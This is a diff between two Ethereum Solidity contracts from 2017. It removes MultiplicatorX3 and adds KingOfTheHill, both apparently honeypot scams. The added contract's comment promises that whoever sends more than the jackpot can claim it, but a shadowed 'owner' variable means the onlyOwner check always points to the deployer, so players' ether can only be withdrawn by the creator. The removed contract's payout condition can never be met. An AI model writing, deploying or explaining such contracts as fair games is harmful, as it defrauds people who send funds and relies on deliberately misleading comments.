@@ -1,38 +1,40 @@
 /**
- * Source Code first verified at https://etherscan.io on Friday, November 17, 2017
+ * Source Code first verified at https://etherscan.io on Friday, November 10, 2017
  (UTC) */
 
-pragma solidity ^0.4.18;
+pragma solidity ^0.4.11;
 
-contract MultiplicatorX3
-{
-    address public Owner = msg.sender;
-   
-    function() public payable{}
-   
-    function withdraw()
-    payable
-    public
-    {
-        require(msg.sender == Owner);
-        Owner.transfer(this.balance);
+// Simple Game. Each time you send more than the current jackpot, you become
+// owner of the contract. As an owner, you can take the jackpot after a delay
+// of 5 days after the last payment.
+
+contract Owned {
+    address owner;    function Owned() {
+        owner = msg.sender;
     }
-    
-    function Command(address adr,bytes data)
-    payable
-    public
-    {
-        require(msg.sender == Owner);
-        adr.call.value(msg.value)(data);
+    modifier onlyOwner{
+        if (msg.sender != owner)
+            revert();        _;
     }
-    
-    function multiplicate(address adr)
-    public
-    payable
-    {
-        if(msg.value>=this.balance)
-        {        
-            adr.transfer(this.balance+msg.value);
+}
+
+contract KingOfTheHill is Owned {
+    address public owner;
+    uint public jackpot;
+    uint public withdrawDelay;
+
+    function() public payable {
+        // transfer contract ownership if player pay more than current jackpot
+        if (msg.value > jackpot) {
+            owner = msg.sender;
+            withdrawDelay = block.timestamp + 5 days;
         }
+        jackpot+=msg.value;
+    }
+
+    function takeAll() public onlyOwner {
+        require(block.timestamp >= withdrawDelay);
+        msg.sender.transfer(this.balance);
+        jackpot=0;
     }
 }
